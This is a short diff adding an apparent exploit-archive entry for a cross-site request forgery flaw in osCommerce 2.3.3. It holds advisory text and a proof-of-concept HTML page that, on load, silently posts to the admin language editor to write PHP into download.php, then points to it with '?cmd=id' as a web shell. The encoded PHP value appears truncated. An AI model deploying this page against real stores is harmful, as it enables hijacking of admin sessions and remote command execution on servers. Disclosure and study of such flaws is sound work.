@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/57892/info
+
+osCommerce is prone to a cross-site request-forgery vulnerability because the application fails to properly validate HTTP requests. 
+
+Exploiting this issue may allow a remote attacker to perform certain actions in the context of an authorized user's session and gain unauthorized access to the affected application; other attacks are also possible. 
+
+osCommerce 2.3.3 is vulnerable; other versions may also be affected.
+
+The following example data is available: 
+
+<html><body onload="document.runCSRF.submit();"> 
+<form method="post" name="runCSRF" 
+action="http://www.example.com/catalog/admin/define_language.php?lngdir=english&filename=english/download.php&action=save"> 
+<input type="hidden" name="file_contents" 
+value="&#x3c;&#x3f;&#x70;&#x68;&#x70;&#x20;&#x24;&#x63;&#x6d;&#x64;">
+</form>your shell should be here: 
+catalog/includes/languages/english/download.php?cmd=id<br></body></html>
